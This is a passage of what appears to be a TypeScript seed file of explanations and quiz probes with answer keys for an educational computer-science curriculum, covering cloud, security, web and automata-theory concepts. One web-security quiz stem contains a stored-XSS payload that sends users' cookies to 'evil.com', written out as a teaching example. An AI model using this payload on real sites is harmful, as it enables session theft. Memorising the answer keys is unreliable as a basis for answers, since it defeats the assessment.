    content: 'Cloud computing delivers compute, storage, and networking as on-demand services over the internet. Service models: IaaS (Infrastructure as a Service — rent VMs, e.g. AWS EC2), PaaS (Platform as a Service — managed environment to deploy code, e.g. Heroku), SaaS (Software as a Service — use software via browser, e.g. Gmail). Deployment: public cloud (AWS/Azure/GCP), private cloud (on-premises), hybrid. Key properties: on-demand provisioning, elasticity (scale up/down), measured service (pay per use), resource pooling. Virtualisation enables multiple isolated VMs on shared physical hardware.',
    targetedMisconceptions: [`${CLOUD}:M1`], source: CLOUD_SRC },
  { conceptId: CLOUD, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "Cloud is always cheaper than on-premises." Cloud has lower upfront cost and scales easily, but per-unit costs at scale can exceed owning hardware. Large organisations with predictable, stable workloads often find on-premises or reserved instances cheaper over 3-5 years. Cloud excels for variable workloads, global reach, and avoiding capital expenditure. Cloud also does not eliminate data security concerns — you still own the data and the responsibility for securing it; the provider secures the infrastructure.',
    targetedMisconceptions: [`${CLOUD}:M1`], source: CLOUD_SRC },
]
const CLOUD_PROBES: SeedProbe[] = [
  { conceptId: CLOUD, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'AWS Lambda (run code without managing servers) is an example of which cloud service model?',
    choices: [
      { text: 'PaaS / FaaS (Function as a Service) — managed execution environment', isCorrect: true },
      { text: 'IaaS — you rent a virtual machine and manage it', isCorrect: false, misconceptionId: `${CLOUD}:M1` },
      { text: 'SaaS — end-user software delivered via browser', isCorrect: false },
    ], correctValue: 'PaaS/FaaS', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${CLOUD}:M1`], source: CLOUD_SRC },
  { conceptId: CLOUD, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Does moving to the cloud eliminate the need to think about data security?',
    choices: [
      { text: 'No — the shared responsibility model: provider secures infrastructure; you secure your data and access controls', isCorrect: true },
      { text: 'Yes — the cloud provider is responsible for all security once you move there', isCorrect: false, misconceptionId: `${CLOUD}:M1` },
    ], correctValue: 'No — shared responsibility model', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${CLOUD}:M1`], source: CLOUD_SRC },
]

// ─── cs.sec ───────────────────────────────────────────────────────────────────
const CYBERETH = 'cs.sec.cyber-ethics-safety'
const CYBERETH_SRC = 'docs/computer-science/kg/graph.json — cs.sec.cyber-ethics-safety'
const CYBERETH_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: CYBERETH, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.HIGH,
    content: 'Cyber ethics covers responsible, legal, and moral use of technology. Key principles: respect privacy (don\'t access others\' data without consent), intellectual property (don\'t pirate software or content), honest representation (no identity fraud), do no harm (don\'t write malware). Digital footprint: every online action leaves a traceable record — posts, searches, purchases. Personal safety: strong unique passwords, 2FA, recognising phishing (urgent language, mismatched sender, suspicious links). Legal context: unauthorised computer access is a criminal offence in most jurisdictions (Computer Fraud and Abuse Act, UK Computer Misuse Act).',
    targetedMisconceptions: [`${CYBERETH}:M1`], source: CYBERETH_SRC },
  { conceptId: CYBERETH, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.HIGH,
    content: 'Misconception: "If it\'s online and publicly visible, I can freely use it." Public visibility ≠ public domain. Photos, text, code, and designs are copyrighted by default from the moment of creation — even without a copyright notice. Using someone\'s photo in a commercial project without a license is copyright infringement. Code on GitHub has a license file; check it before use. Content may be seen by anyone but owned by someone.',
    targetedMisconceptions: [`${CYBERETH}:M1`], source: CYBERETH_SRC },
]
const CYBERETH_PROBES: SeedProbe[] = [
  { conceptId: CYBERETH, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.HIGH,
    stem: 'A photo on a public Instagram account — can you legally use it in a school project poster without permission?',
    choices: [
      { text: 'Only if the license permits it — public ≠ free to use; it is copyrighted by default', isCorrect: true },
      { text: 'Yes — it\'s public so there are no restrictions', isCorrect: false, misconceptionId: `${CYBERETH}:M1` },
    ], correctValue: 'Check license — public ≠ free', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${CYBERETH}:M1`], source: CYBERETH_SRC },
  { conceptId: CYBERETH, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.HIGH,
    stem: 'What makes an email likely to be a phishing attempt?',
    choices: [
      { text: 'Urgent demands, a sender address that doesn\'t match the claimed organisation, and suspicious links', isCorrect: true },
      { text: 'Being sent to your spam folder — legitimate emails never go to spam', isCorrect: false },
    ], correctValue: 'Urgent/mismatched sender/suspicious links', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${CYBERETH}:M1`], source: CYBERETH_SRC },
]

const CRYPTOBAS = 'cs.sec.cryptography-basics'
const CRYPTOBAS_SRC = 'docs/computer-science/kg/graph.json — cs.sec.cryptography-basics'
const CRYPTOBAS_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: CRYPTOBAS, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Symmetric encryption: same key encrypts and decrypts — fast, used for bulk data (AES-256). Problem: securely sharing the key. Asymmetric (public-key) cryptography: key pair — public key encrypts (or verifies), private key decrypts (or signs). RSA, ECDSA. TLS handshake: asymmetric key exchange negotiates a symmetric session key; bulk data then uses symmetric encryption. Hash functions: one-way, fixed-size output (SHA-256). Used for: password storage (bcrypt — slow hash with salt), data integrity (HMAC), digital signatures (sign the hash, not the message).',
    targetedMisconceptions: [`${CRYPTOBAS}:M1`], source: CRYPTOBAS_SRC },
  { conceptId: CRYPTOBAS, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "Hashing and encryption are the same thing." Encryption is reversible with the right key. Hashing is one-way — you cannot recover the original from the hash. Password databases store bcrypt hashes (with salt); to verify, re-hash the input and compare. If they stored encrypted passwords, a leaked encryption key would expose all passwords. SHA-256 is not appropriate for passwords alone — it\'s too fast, enabling billions of guesses per second; use bcrypt, Argon2, or scrypt (deliberately slow).',
    targetedMisconceptions: [`${CRYPTOBAS}:M1`], source: CRYPTOBAS_SRC },
]
const CRYPTOBAS_PROBES: SeedProbe[] = [
  { conceptId: CRYPTOBAS, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'A website stores your password as a bcrypt hash. To verify your login, it:',
    choices: [
      { text: 'Re-hashes your input and compares to the stored hash', isCorrect: true },
      { text: 'Decrypts the stored hash back to the original password and compares', isCorrect: false, misconceptionId: `${CRYPTOBAS}:M1` },
    ], correctValue: 'Re-hash and compare', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${CRYPTOBAS}:M1`], source: CRYPTOBAS_SRC },
  { conceptId: CRYPTOBAS, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Why is SHA-256 alone not appropriate for storing passwords?',
    choices: [
      { text: 'SHA-256 is too fast — attackers can try billions of guesses per second; use slow algorithms like bcrypt', isCorrect: true },
      { text: 'SHA-256 is reversible so attackers can recover the password', isCorrect: false, misconceptionId: `${CRYPTOBAS}:M1` },
    ], correctValue: 'Too fast — use slow hash for passwords', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${CRYPTOBAS}:M1`], source: CRYPTOBAS_SRC },
]

const NETSEC = 'cs.sec.network-web-security'
const NETSEC_SRC = 'docs/computer-science/kg/graph.json — cs.sec.network-web-security'
const NETSEC_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: NETSEC, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Key web attacks: SQL injection (untrusted input alters database query — prevented by parameterised queries), XSS/Cross-Site Scripting (injected script runs in victim\'s browser — prevented by output encoding), CSRF/Cross-Site Request Forgery (forged request uses victim\'s session — prevented by CSRF tokens), MITM/Man-in-the-Middle (attacker intercepts traffic — prevented by TLS + HSTS). OWASP Top 10 enumerates the most critical web security risks. Defence in depth: validate input, encode output, principle of least privilege, patch promptly.',
    targetedMisconceptions: [`${NETSEC}:M1`], source: NETSEC_SRC },
  { conceptId: NETSEC, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "Our site is too small to be attacked." Automated bots scan every IP address continuously — your site WILL be probed for SQL injection, XSS, default credentials, and known CVEs minutes after it goes live, regardless of size. Most attacks are opportunistic, not targeted. A small site running an unpatched CMS or with SQL injection vulnerabilities will be exploited — not because attackers know you, but because a bot found your vulnerability first.',
    targetedMisconceptions: [`${NETSEC}:M1`], source: NETSEC_SRC },
]
const NETSEC_PROBES: SeedProbe[] = [
  { conceptId: NETSEC, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'An attacker injects <script>document.location="http://evil.com?c="+document.cookie</script> into a comment field that renders in other users\' browsers. This is:',
    choices: [
      { text: 'XSS (Cross-Site Scripting) — stored malicious script runs in victims\' browsers', isCorrect: true },
      { text: 'SQL injection — manipulating a database query', isCorrect: false, misconceptionId: `${NETSEC}:M1` },
      { text: 'CSRF — forging a request using a victim\'s session', isCorrect: false },
    ], correctValue: 'XSS', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${NETSEC}:M1`], source: NETSEC_SRC },
  { conceptId: NETSEC, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Is a small personal website exempt from automated bot attacks because no one knows it exists?',
    choices: [
      { text: 'No — bots scan all IPs continuously; small sites are probed within minutes of going live', isCorrect: true },
      { text: 'Yes — attackers only target large, high-profile websites', isCorrect: false, misconceptionId: `${NETSEC}:M1` },
    ], correctValue: 'No — automated bots scan everything', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${NETSEC}:M1`], source: NETSEC_SRC },
]

const DATAPROT = 'cs.sec.data-protection-privacy'
const DATAPROT_SRC = 'docs/computer-science/kg/graph.json — cs.sec.data-protection-privacy'
const DATAPROT_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: DATAPROT, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Data protection law (GDPR in EU, UK GDPR, CCPA in California) governs how personal data is collected, stored, and processed. Key principles: lawfulness (need a legal basis — consent, legitimate interest, contract), purpose limitation (collect data for specified purposes only), data minimisation (only what\'s needed), accuracy, storage limitation, integrity and confidentiality, accountability. Individual rights: access, rectification, erasure ("right to be forgotten"), portability. Breaches must be reported to regulators within 72 hours. Privacy by design: build privacy protections into systems from the start.',
    targetedMisconceptions: [`${DATAPROT}:M1`], source: DATAPROT_SRC },
  { conceptId: DATAPROT, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "GDPR only applies to EU companies." GDPR applies to any organisation that processes personal data of EU/UK residents, regardless of where the organisation is based. A US company serving EU customers must comply. Non-compliance fines reach €20 million or 4% of global annual revenue (whichever is higher). The regulation is enforced extraterritorially — several non-EU companies have received fines.',
    targetedMisconceptions: [`${DATAPROT}:M1`], source: DATAPROT_SRC },
]
const DATAPROT_PROBES: SeedProbe[] = [
  { conceptId: DATAPROT, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Under GDPR, a user requests deletion of all their data. What is this right called?',
    choices: [
      { text: 'Right to erasure (right to be forgotten)', isCorrect: true },
      { text: 'Right to portability', isCorrect: false },
      { text: 'Right to rectification', isCorrect: false },
    ], correctValue: 'Right to erasure', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${DATAPROT}:M1`], source: DATAPROT_SRC },
  { conceptId: DATAPROT, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'A US startup collects data from European users. Must it comply with GDPR?',
    choices: [
      { text: 'Yes — GDPR applies based on where the DATA SUBJECTS are, not where the company is', isCorrect: true },
      { text: 'No — GDPR only applies to companies headquartered in the EU', isCorrect: false, misconceptionId: `${DATAPROT}:M1` },
    ], correctValue: 'Yes — extraterritorial scope', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${DATAPROT}:M1`], source: DATAPROT_SRC },
]

// ─── cs.web ───────────────────────────────────────────────────────────────────
const CLISRV = 'cs.web.client-server-model'
const CLISRV_SRC = 'docs/computer-science/kg/graph.json — cs.web.client-server-model'
const CLISRV_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: CLISRV, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.HIGH,
    content: 'In the client-server model, clients (browsers, apps) request services; servers respond. HTTP is stateless: each request is independent — no built-in memory of previous requests. State is maintained externally via cookies (small key-value pairs stored in the browser, sent with every request), sessions (server-side storage keyed by a session ID in a cookie), or JWTs (JSON Web Tokens — signed tokens carrying claims, stored client-side). The web evolved from static HTML served on request to dynamic server-side rendering (PHP/Django) to client-side single-page applications (React/Vue) calling REST APIs.',
    targetedMisconceptions: [`${CLISRV}:M1`], source: CLISRV_SRC },
  { conceptId: CLISRV, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.HIGH,
    content: 'Misconception: "The server remembers who I am between requests automatically." HTTP is stateless by design — the server has no memory of previous requests. The browser must re-identify the user on every request by sending a cookie or token. This is why logging in sets a cookie — without it, the next page load is anonymous. Stateless design enables easy horizontal scaling (any server can handle any request) but requires explicit session management.',
    targetedMisconceptions: [`${CLISRV}:M1`], source: CLISRV_SRC },
]
const CLISRV_PROBES: SeedProbe[] = [
  { conceptId: CLISRV, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.HIGH,
    stem: 'After logging in to a website, how does the server know you are still logged in on the next page load?',
    choices: [
      { text: 'The browser sends a session cookie or token that the server validates on each request', isCorrect: true },
      { text: 'The server maintains a persistent TCP connection that identifies the user', isCorrect: false, misconceptionId: `${CLISRV}:M1` },
    ], correctValue: 'Cookie or token on each request', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${CLISRV}:M1`], source: CLISRV_SRC },
  { conceptId: CLISRV, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.HIGH,
    stem: 'Why is HTTP described as stateless?',
    choices: [
      { text: 'Each HTTP request is independent — the server has no inherent memory of previous requests', isCorrect: true },
      { text: 'HTTP stores no data whatsoever — it cannot transmit cookies', isCorrect: false },
    ], correctValue: 'Each request independent', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${CLISRV}:M1`], source: CLISRV_SRC },
]

const HTMLCSS = 'cs.web.html-css-basics'
const HTMLCSS_SRC = 'docs/computer-science/kg/graph.json — cs.web.html-css-basics'
const HTMLCSS_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: HTMLCSS, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.HIGH,
    content: 'HTML (HyperText Markup Language) defines the STRUCTURE and CONTENT of a web page using elements (tags + attributes + content). Semantic elements: <header>, <nav>, <main>, <article>, <section>, <footer> — communicate meaning to browsers and screen readers. CSS (Cascading Style Sheets) controls PRESENTATION: selectors target elements; declarations set properties. Cascade: specificity (inline > ID > class > tag) determines which rule wins. Box model: content → padding → border → margin. Flexbox and Grid enable responsive layouts. Separation of concerns: HTML for content, CSS for style, JavaScript for behaviour.',
    targetedMisconceptions: [`${HTMLCSS}:M1`], source: HTMLCSS_SRC },
  { conceptId: HTMLCSS, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.HIGH,
    content: 'Misconception: "I should use <div> everywhere — it\'s the standard building block." Divs are generic containers with no semantic meaning. Screen readers and search engines cannot infer structure from divs alone. <article>, <nav>, <header> communicate WHAT the content is. A blind user navigating by heading (h1-h6) structure benefits enormously from semantic HTML; a page of nested divs is opaque. "Div soup" is a recognised anti-pattern; semantic HTML improves accessibility, SEO, and maintainability.',
    targetedMisconceptions: [`${HTMLCSS}:M1`], source: HTMLCSS_SRC },
]
const HTMLCSS_PROBES: SeedProbe[] = [
  { conceptId: HTMLCSS, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.HIGH,
    stem: 'Two CSS rules target the same element: an ID selector (#hero) and a class selector (.highlight). Which rule wins?',
    choices: [
      { text: 'The ID selector — IDs have higher specificity than classes', isCorrect: true },
      { text: 'The class selector — classes override IDs in the cascade', isCorrect: false, misconceptionId: `${HTMLCSS}:M1` },
      { text: 'The rule defined last in the CSS file', isCorrect: false },
    ], correctValue: 'ID selector wins', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${HTMLCSS}:M1`], source: HTMLCSS_SRC },
  { conceptId: HTMLCSS, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.HIGH,
    stem: 'Why should you use <nav> instead of <div id="navigation"> for a navigation bar?',
    choices: [
      { text: '<nav> conveys semantic meaning to screen readers and search engines; <div> is a generic container', isCorrect: true },
      { text: '<div> is deprecated — browsers no longer render it', isCorrect: false },
    ], correctValue: 'Semantic meaning for accessibility/SEO', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${HTMLCSS}:M1`], source: HTMLCSS_SRC },
]

const RESTAPI = 'cs.web.rest-apis'
const RESTAPI_SRC = 'docs/computer-science/kg/graph.json — cs.web.rest-apis'
const RESTAPI_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: RESTAPI, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'REST (Representational State Transfer) is an architectural style for web APIs. Resources are identified by URLs (/users/42); HTTP methods express actions: GET (retrieve), POST (create), PUT/PATCH (update), DELETE (remove). Stateless: each request carries all needed info (no server session). JSON is the standard exchange format. Status codes communicate outcome: 200 OK, 201 Created, 400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found, 500 Internal Server Error. Python requests library: requests.get(url), requests.post(url, json={...}). Authentication: API key in header, or OAuth2 bearer token.',
    targetedMisconceptions: [`${RESTAPI}:M1`], source: RESTAPI_SRC },
  { conceptId: RESTAPI, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "REST is a protocol like HTTP." REST is an architectural STYLE — a set of constraints (stateless, uniform interface, resource-based URLs, standard methods). HTTP is the protocol that REST APIs are typically implemented over. An API can use HTTP without being RESTful (e.g., all requests to the same endpoint with action in the body — RPC style). GraphQL is another API style over HTTP that is NOT REST. REST is a design philosophy, not a technical specification.',
    targetedMisconceptions: [`${RESTAPI}:M1`], source: RESTAPI_SRC },
]
const RESTAPI_PROBES: SeedProbe[] = [
  { conceptId: RESTAPI, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'A REST API endpoint DELETE /articles/99 returns 404. What does this mean?',
    choices: [
      { text: 'Article 99 was not found — cannot delete a non-existent resource', isCorrect: true },
      { text: 'The DELETE method is not supported by the API', isCorrect: false },
      { text: 'The article was successfully deleted', isCorrect: false, misconceptionId: `${RESTAPI}:M1` },
    ], correctValue: 'Resource not found', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${RESTAPI}:M1`], source: RESTAPI_SRC },
  { conceptId: RESTAPI, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Is REST a protocol?',
    choices: [
      { text: 'No — REST is an architectural style / set of constraints; HTTP is the protocol', isCorrect: true },
      { text: 'Yes — REST defines the wire format and transport of web API messages', isCorrect: false, misconceptionId: `${RESTAPI}:M1` },
    ], correctValue: 'No — architectural style', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${RESTAPI}:M1`], source: RESTAPI_SRC },
]
// ─── cs.theory (5 concepts) ───────────────────────────────────────────────

const FINAUTO = 'cs.theory.finite-automata'
const FINAUTO_SRC = 'docs/computer-science/kg/graph.json — cs.theory.finite-automata'
const FINAUTO_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: FINAUTO, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'A finite automaton (FA) models computation with a finite number of states. It reads input symbols one at a time, transitions between states via a transition function, and accepts input if it ends in an accepting state. DFAs have exactly one transition per (state, symbol) pair; NFAs may have zero or many. Both recognise exactly the regular languages. Key result: every NFA can be converted to an equivalent DFA via subset construction — NFAs are no more powerful, only sometimes more concise.',
    targetedMisconceptions: [`${FINAUTO}:M1`], source: FINAUTO_SRC },
  { conceptId: FINAUTO, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "NFAs are more powerful than DFAs because they can be in multiple states at once." Power means recognising strictly more languages — NFAs and DFAs recognise the same class (regular languages). Multi-state execution is an implementation detail that sometimes yields smaller descriptions, not extra expressive power. Also: a TM looping forever does not reject — it neither accepts nor rejects, which is why recognisable ≠ decidable.',
    targetedMisconceptions: [`${FINAUTO}:M1`], source: FINAUTO_SRC },
]
const FINAUTO_PROBES: SeedProbe[] = [
  { conceptId: FINAUTO, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'A DFA has 4 states and alphabet {0,1}. How many entries does its transition function have?',
    choices: [
      { text: '8 — one per (state, symbol) pair: 4 × 2', isCorrect: true },
      { text: '4 — one per state', isCorrect: false },
      { text: '16 — the cross-product squared', isCorrect: false },
      { text: '2 — one per symbol', isCorrect: false },
    ], correctValue: '8', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [], source: FINAUTO_SRC },
  { conceptId: FINAUTO, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'An NFA recognises language L that no DFA can recognise. True or false?',
    choices: [
      { text: 'False — every NFA has an equivalent DFA; both recognise exactly the regular languages', isCorrect: true },
      { text: 'True — NFAs have extra power from non-determinism', isCorrect: false, misconceptionId: `${FINAUTO}:M1` },
      { text: 'True only for infinite languages', isCorrect: false },
      { text: 'Depends on alphabet size', isCorrect: false },
    ], correctValue: 'False', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${FINAUTO}:M1`], source: FINAUTO_SRC },
]

const REGEX = 'cs.theory.regular-expressions'
const REGEX_SRC = 'docs/computer-science/kg/graph.json — cs.theory.regular-expressions'
const REGEX_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: REGEX, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Regular expressions (regex) describe regular languages using three operations: union (|), concatenation, and Kleene star (*). Every regex corresponds to an NFA (Thompson\'s construction) confirming they cover exactly the regular languages. Practical engines (PCRE) extend theoretical regex with backreferences, making them strictly more expressive — theoretical and practical regex are distinct. Core patterns: . (any char), + (one or more), ? (zero or one), [] (character class), ^ / $ (anchors). Greedy quantifiers match as much as possible; lazy (.*?) as little as possible.',
    targetedMisconceptions: [`${REGEX}:M1`], source: REGEX_SRC },
  { conceptId: REGEX, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "I can write a regex to match balanced parentheses." Balanced parentheses require unbounded counting — no finite automaton (or theoretical regex) can do this. It is a context-free, not regular, language. Practical PCRE engines with backreferences approximate it but exceed regular-language power. Also: greedy .* can cause catastrophic backtracking on pathological inputs; never assume regex always runs in linear time.',
    targetedMisconceptions: [`${REGEX}:M1`], source: REGEX_SRC },
]
const REGEX_PROBES: SeedProbe[] = [
  { conceptId: REGEX, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Which strings match ^a(b|c)*d$?',
    choices: [
      { text: 'All of: "ad", "abd", "abcd"', isCorrect: true },
      { text: 'Only "abd"', isCorrect: false },
      { text: 'Only strings ending in "bc"', isCorrect: false },
      { text: 'No string — the pattern is invalid', isCorrect: false },
    ], correctValue: '"ad", "abd", "abcd" all match', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [], source: REGEX_SRC },
  { conceptId: REGEX, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Can a theoretical (formal) regular expression match exactly the strings with equal numbers of a\'s and b\'s?',
    choices: [
      { text: 'No — equal a\'s and b\'s requires counting; this is a context-free language, not regular', isCorrect: true },
      { text: 'Yes — using * and | we can count characters', isCorrect: false, misconceptionId: `${REGEX}:M1` },
      { text: 'Yes — with backreferences in the pattern', isCorrect: false },
      { text: 'Only for strings up to length 100', isCorrect: false },
    ], correctValue: 'No — not regular', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${REGEX}:M1`], source: REGEX_SRC },
]

const CFG = 'cs.theory.context-free-grammars'
const CFG_SRC = 'docs/computer-science/kg/graph.json — cs.theory.context-free-grammars'
const CFG_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: CFG, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'A context-free grammar (CFG) has terminals, non-terminals, a start symbol, and rules A → α. CFGs generate context-free languages (CFLs) — a strictly larger class than regular languages, including palindromes and balanced brackets. Parse trees show hierarchical derivation. Pushdown automata (PDAs) recognise exactly CFLs using a stack. Two normal forms simplify proofs: Chomsky Normal Form (A→BC or A→a) and Greibach Normal Form (rules start with a terminal). Real compilers use LL (top-down) or LR (bottom-up) parsers for deterministic CFL subsets.',
    targetedMisconceptions: [`${CFG}:M1`], source: CFG_SRC },
  { conceptId: CFG, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "CFGs describe any programming language syntax." Most syntax is context-free, but some features (variable-declared-before-use) are context-sensitive — handled by semantic analysis, not the grammar. Another error: conflating an ambiguous grammar with an ambiguous language. A grammar is ambiguous if a string has two parse trees; the language may still be unambiguous (another grammar may parse it uniquely). The dangling-else problem is grammar ambiguity resolved by convention.',
    targetedMisconceptions: [`${CFG}:M1`], source: CFG_SRC },
]
const CFG_PROBES: SeedProbe[] = [
  { conceptId: CFG, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Which automaton recognises exactly the context-free languages?',
    choices: [
      { text: 'Pushdown automaton (PDA)', isCorrect: true },
      { text: 'Finite automaton', isCorrect: false },
      { text: 'Turing machine', isCorrect: false },
      { text: 'Linear bounded automaton', isCorrect: false },
    ], correctValue: 'Pushdown automaton', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [], source: CFG_SRC },
  { conceptId: CFG, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'A grammar is ambiguous. Does this mean its language is inherently ambiguous?',
    choices: [
      { text: 'No — a different grammar may parse the same language unambiguously', isCorrect: true },
      { text: 'Yes — grammar ambiguity always implies language ambiguity', isCorrect: false, misconceptionId: `${CFG}:M1` },
      { text: 'Only if the grammar has more than 10 production rules', isCorrect: false },
      { text: 'Only for infinite languages', isCorrect: false },
    ], correctValue: 'No — another grammar may be unambiguous', difficulty: ProbeDifficulty.ADVANCED, targetedMisconceptions: [`${CFG}:M1`], source: CFG_SRC },
]

const TURING = 'cs.theory.turing-machines'
const TURING_SRC = 'docs/computer-science/kg/graph.json — cs.theory.turing-machines'
const TURING_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: TURING, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'A Turing machine (TM) has an infinite tape, a read/write head, a finite state set, and a transition function that reads a symbol, writes a symbol, moves left/right, and changes state. TMs define Turing-recognisable (recursively enumerable) languages — the broadest Chomsky class. Decidable languages are those for which a TM always halts. The Church-Turing thesis: any effectively computable function can be computed by a TM. The Halting Problem — deciding whether an arbitrary TM halts on a given input — is undecidable, proved by diagonalisation.',
    targetedMisconceptions: [`${TURING}:M1`], source: TURING_SRC },
  { conceptId: TURING, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "Modern computers are more powerful than Turing machines." In computability terms they are equivalent — a CPU with unbounded memory is a TM. Differences are physical resource constraints, not what is computable in principle. Another error: "A TM that loops rejects." A TM that loops neither accepts nor rejects — this is why recognisable ≠ decidable. Decidable languages require a TM that always halts (accepting or rejecting) on every input.',
    targetedMisconceptions: [`${TURING}:M1`], source: TURING_SRC },
]
const TURING_PROBES: SeedProbe[] = [
  { conceptId: TURING, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'The Halting Problem is:',
    choices: [
      { text: 'Undecidable — no TM can determine for all (TM, input) pairs whether that TM halts', isCorrect: true },
      { text: 'Decidable with enough memory', isCorrect: false },
      { text: 'Solvable in polynomial time', isCorrect: false },
      { text: 'Decidable only for finite-state programs', isCorrect: false },
    ], correctValue: 'Undecidable', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [], source: TURING_SRC },
  { conceptId: TURING, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
